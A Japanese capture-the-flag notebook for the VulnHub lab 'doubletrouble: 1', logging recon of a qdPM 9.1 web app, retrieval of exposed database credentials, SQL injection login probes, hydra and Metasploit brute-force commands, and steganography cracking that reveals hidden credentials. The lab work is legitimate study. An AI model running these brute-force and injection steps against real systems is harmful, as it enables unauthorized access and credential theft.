# doubletrouble: 1

https://www.vulnhub.com/entry/doubletrouble-1,743/

CTF の思考プロセスをメモして後から検証する目的の文書。

## スキャン

- 掲載情報には、難易度 Easy と書かれているだけ
- Web ページを開いたら、E メールとパスワード入力のログイン画面が表示される
- ログイン画面には「Remenber Me」チェックボックスがある
- qdPM 9.1 と表示されている。ググったらプロジェクト管理アプリらしい
- パスワード忘れに備えた、E メールのみ入力する画面がある

### IP アドレス

```shell
sudo netdiscover -r 192.168.11.0/24
```

### ポートスキャン

```shell
$ sudo nmap -sS -sV -A -p- 192.168.11.21

Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-30 06:16 EST
Nmap scan report for 192.168.11.21
Host is up (0.00023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6afed61723cb90792bb12d3753974658 (RSA)
|   256 5bc468d18959d748b096f311871c08ac (ECDSA)
|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: qdPM | Login
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:C9:26:60 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.11.21
```

開いているポートは SSH と Apache のみ

```shell
$ dirb http://192.168.11.21 /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Nov 30 06:28:40 2024
URL_BASE: http://192.168.11.21/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.11.21/ ----
==> DIRECTORY: http://192.168.11.21/backups/
==> DIRECTORY: http://192.168.11.21/batch/
==> DIRECTORY: http://192.168.11.21/core/
==> DIRECTORY: http://192.168.11.21/css/
+ http://192.168.11.21/favicon.ico (CODE:200|SIZE:894)
==> DIRECTORY: http://192.168.11.21/images/
+ http://192.168.11.21/index.php (CODE:200|SIZE:5812)
==> DIRECTORY: http://192.168.11.21/install/
==> DIRECTORY: http://192.168.11.21/js/
+ http://192.168.11.21/robots.txt (CODE:200|SIZE:26)
==> DIRECTORY: http://192.168.11.21/secret/
+ http://192.168.11.21/server-status (CODE:403|SIZE:278)
==> DIRECTORY: http://192.168.11.21/sf/
==> DIRECTORY: http://192.168.11.21/template/
==> DIRECTORY: http://192.168.11.21/uploads/

---- Entering directory: http://192.168.11.21/backups/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/batch/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/core/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/install/ ----
==> DIRECTORY: http://192.168.11.21/install/actions/
==> DIRECTORY: http://192.168.11.21/install/css/
==> DIRECTORY: http://192.168.11.21/install/images/
+ http://192.168.11.21/install/index.php (CODE:200|SIZE:1815)
==> DIRECTORY: http://192.168.11.21/install/lib/
==> DIRECTORY: http://192.168.11.21/install/modules/

---- Entering directory: http://192.168.11.21/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/secret/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/sf/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/template/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/install/actions/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/install/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/install/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/install/lib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.11.21/install/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Sat Nov 30 06:28:42 2024
DOWNLOADED: 9224 - FOUND: 5

```

http://192.168.11.21/secret/  
には、画像が入っているだけだった。  
http://192.168.11.21/install/  
は qdPM をインストールする機能で、DB 接続情報を入れるフォームがあって興味深いが、横に置いておく。

### qdPM の脆弱性検索

```shell
$ searchsploit qdpm
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                       |  Path
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
qdPM 7 - Arbitrary File upload                                                                                       | php/webapps/19154.py
qdPM 7.0 - Arbitrary '.PHP' File Upload (Metasploit)                                                                 | php/webapps/21835.rb
qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting                                                       | php/webapps/48486.txt
qdPM 9.1 - 'filter_by' SQL Injection                                                                                 | php/webapps/45767.txt
qdPM 9.1 - 'search[keywords]' Cross-Site Scripting                                                                   | php/webapps/46399.txt
qdPM 9.1 - 'search_by_extrafields[]' SQL Injection                                                                   | php/webapps/46387.txt
qdPM 9.1 - 'type' Cross-Site Scripting                                                                               | php/webapps/46398.txt
qdPM 9.1 - Arbitrary File Upload                                                                                     | php/webapps/48460.txt
qdPM 9.1 - Remote Code Execution                                                                                     | php/webapps/47954.py
qdPM 9.1 - Remote Code Execution (Authenticated)                                                                     | php/webapps/50175.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)                                                          | php/webapps/50944.py
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                         | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                                                       | php/webapps/50176.txt
qdPM < 9.1 - Remote Code Execution                                                                                   | multiple/webapps/48146.py
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- qdPM 9.1 は脆弱性が多く、Web ログインさえできれば RCE 可能と思われる
- この時点の注目は（Password Exposure (Unauthenticated)

php/webapps/50176.txt

```text
# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
# Date: 03/08/2021
# Exploit Author: Leon Trappett (thepcn3rd)
# Vendor Homepage: https://qdpm.net/
# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
# Version: 9.2
# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4

The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.
```

データベース接続情報が yml ファイルに書かれており、しかもダウンロード可能。

databases.yml

```yml
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: "mysql:dbname=qdpm;host=localhost"
      profiler: false
      username: otis
      password: "<?php echo urlencode('rush') ; ?>"
      attributes:
        quote_identifier: true
```

MySQL の接続情報（DB 名、ユーザー名、パスワード）が判明した。  
しかし、MySQL のポートは外部に開いていないので、まずはシェルを開く必要がある。

## エクスプロイト

### ログイン画面

```text
普通に間違える：「No match for Email and/or Password」表示
パスワード空白：無反応（GETに行かない）
パスワードParam削除：無反応（GETに行かない）
Eメールシングルクォート：無反応（GETに行かない）
パスワードシングルクォート：無反応（GETに行かない）
test=1追加：「No match for Email and/or Password」表示
Eメール 'or'1'='1：「No match for Email and/or Password」表示
パスワード 'or'1'='1：「No match for Email and/or Password」表示
両方 'or'1'='1：無反応（GETに行かない）
```

- 無反応のときはサーバー側で何かのエラーが発生している？
- エラー表示のときと無反応のときの条件で何か意味がありそうな気がするが不明

### パスワード忘れ画面

```text
普通に間違える：「No records found」表示
Eメール空白：無反応（GETに行かない）
EメールParam削除：無反応（GETに行かない）
Eメールシングルクォート：無反応（GETに行かない）
Eメール 'or'1'='1：無反応（GETに行かない）
```

- SQL インジェクションではログインできそうにない
- PHP 特有のインジェクションも、このフォームの内容ではできないのではないか？
- E メールアドレスのヒントがないとブルートフォースは無理

## 途中経過

- DB 接続情報を得ることは成功した
- Web ログインか、シェルログインを成功させる必要がある

/install ページに DB 接続情報入力フォームがあることを思い出した。  
取得した接続情報を入力したらどうなるだろう？

### install ページ

でたらめの DB 接続情報を入れてみたところ、接続失敗エラーが表示された。  
入手した DB 接続情報を入れたところ、qdpm config の画面に進んだ。  
デフォルトの管理ユーザーは「admin@localhost.com」と入力されている。

### admin@localhost.com でログイン画面探査

```text
admin：「No match for Email and/or Password」表示
admin@localhost.com：「No match for Email and/or Password」表示
qdpm：「No match for Email and/or Password」表示
'：「No match for Email and/or Password」表示
'or'1'='1：「No match for Email and/or Password」表示
```

応答を見る限り、受信したパスワードは、URL エンコードして使っている？  
そもそもこの E メールアドレスが有効かどうか不明。

### パスワード忘れ画面で admin@localhost.com を入れてみる

パスワードが変わってしまうのでリスキーだが、有効なメールアドレスかどうかは判別できる。  
結果、「A new password has been sent to your e-mail address」と表示された（されてしまった？）

admin@localhost.com が存在することは分かったが、CTF として、admin@localhost.com のパスワードが推測可能だったり、どこかに書かれている場合はここで詰みである。  
そもそも現実のシナリオだったらこの時点で明らかに失敗であり、反省。

ずるいが、環境をリセットしてやり直す。

### hydra によるパスワードブルートフォース

```shell
$ hydra -l admin@localhost.com -P /usr/share/wordlists/rockyou.txt 192.168.11.22 http-post-form "/index.php/login:login&login%5Bemail%5D=^USER^&login%5Bpassword%5D=^PASS^&http_referer=http\://192.168.11.22/:C=/index.php/login/restorePassword:No match for Email and/or Password"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-30 23:06:06
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.11.22:80/index.php/login:login&login%5Bemail%5D=^USER^&login%5Bpassword%5D=^PASS^&http_referer=http\://192.168.11.22/:C=/index.php/login/restorePassword:No match for Email and/or Password
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: nicole
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: 123456
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: rockyou
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: daniel
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: 12345
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: monkey
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: princess
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: 12345678
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: 1234567
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: abc123
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: 123456789
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: iloveyou
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: babygirl
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: lovely
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: jessica
[80][http-post-form] host: 192.168.11.22   login: admin@localhost.com   password: password
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-30 23:06:08
```

CSRF 攻撃が検出されて期待した結果にならなかった。  
hydra では回避が難しそうなので、Burp intruder によるブルートフォースを試みる。

### Burp intruder によるパスワードブルートフォース

Redirect 設定 ON  
使用したパスワードリスト

- /usr/share/wordlists/metasploit/http_default_pass.txt
- /usr/share/wordlists/metasploit/mirai_pass.txt
- /usr/share/wordlists/metasploit/unix_passwords.txt

（終わるまで待てなかったが）ヒットせず。ブルートフォースは無理と判断。

## install ページの脆弱性探査

URL パラメータ

```text
?step=database_config
```

```shell
dotdotpwn -m http-url -u http://192.168.11.22/install/index.php?step=TRAVERSAL -f /etc/passwd -k "root" -d 5 -t 50
```

トラバーサルは発見できず。

## SSH ブルートフォース

```shell
use use auxiliary/scanner/ssh/ssh_login
set USERPASS_FILE /usr/share/wordlists/metasploit/mirai_user_pass.txt
exploit
```

ヒットせず。

## nikto

```shell
$ nikto -h http://192.168.11.18
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.11.18
+ Target Hostname:    192.168.11.18
+ Target Port:        80
+ Start Time:         2024-12-03 02:03:47 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie qdPM8 created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /install/: This might be interesting.
+ /readme.txt: This might be interesting.
+ /secret/: Directory indexing found.
+ /secret/: This might be interesting.
+ /template/: Directory indexing found.
+ /template/: This might be interesting: could have sensitive files or system information.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8104 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2024-12-03 02:04:21 (GMT-5) (34 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

ローカルに DB を作ってインストールしてみる

```shell
CREATE DATABASE qdpm;
CREATE USER 'otis'@'%' IDENTIFIED BY 'rush';
GRANT ALL PRIVILEGES ON qdpm.* TO 'otis'@'%';
FLUSH PRIVILEGES;
EXIT;

$ sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf
```

ログインできた。完璧に気付かれるのでこの方法が合っているかは自信無い。

→ 　ファイルアップロードでエラーが発生するため断念

以下は、VM をクリーンに入れなおしてから再開。

## steghide で残念賞の画像を解析

```shell
$ steghide --extract -sf ./doubletrouble.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

パスワードが分からない

```shell
$ stegcracker ./doubletrouble.jpg
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2024 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which
will blast through the rockyou.txt wordlist within 1.9 second as opposed
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file './doubletrouble.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: 92camaros
Tried 134340 passwords
Your file has been written to: ./doubletrouble.jpg.out
92camaro
```

92camaro と判明

```shell
$ steghide --extract -sf ./doubletrouble.jpg
Enter passphrase:
wrote extracted data to "creds.txt".

$ cat ./creds.txt
otisrush@localhost.com
otis666
```

正規のログインをしてもアップロード失敗する。  
画面だけでなく、どのエクスプロイトを実行しても、アップロード処理でエラーになる。

```text
Fatal error: Uncaught Error: Call to undefined function imagecreatefromjpeg() in /var/www/html/core/lib/model/app.class.php:794 Stack trace: #0 /var/www/html/core/apps/qdPM/modules/myAccount/actions/actions.class.php(117): app::image_resize('/var/www/html/c...', '/var/www/html/c...') #1 /var/www/html/core/apps/qdPM/modules/myAccount/actions/actions.class.php(56): myAccountActions->processForm(Object(sfWebRequest), Object(UsersForm)) #2 /var/www/html/core/lib/vendor/symfony/lib/action/sfActions.class.php(60): myAccountActions->executeUpdate(Object(sfWebRequest)) #3 /var/www/html/core/lib/vendor/symfony/lib/filter/sfExecutionFilter.class.php(92): sfActions->execute(Object(sfWebRequest)) #4 /var/www/html/core/lib/vendor/symfony/lib/filter/sfExecutionFilter.class.php(78): sfExecutionFilter->executeAction(Object(myAccountActions)) #5 /var/www/html/core/lib/vendor/symfony/lib/filter/sfExecutionFilter.class.php(42): sfExecutionFilter->handleAction(Object(sfFilterChain), Object(myAccountActions)) #6 /var/www/html/core/lib/vendor/ in /var/www/html/core/lib/model/app.class.php on line 794
```

エラー内容から、VM 側で GD extension が有効になっていないため発生していると思われる。  
この CTF について Web で調査したところ、普通にアップロードできるのが期待動作。  
VM 側のデバッグは困難かつ本筋ではないのでここで中止する。

## 振り返り

- rockyou.txt を使う CTF も存在することを認識
- steghide と stegcracker で画像に隠された機密情報を暴くパターン
- 普通の画像に steghide を使っても「パスフレーズが違います」としか言ってくれないので、クラックを試みるかどうかは迷う
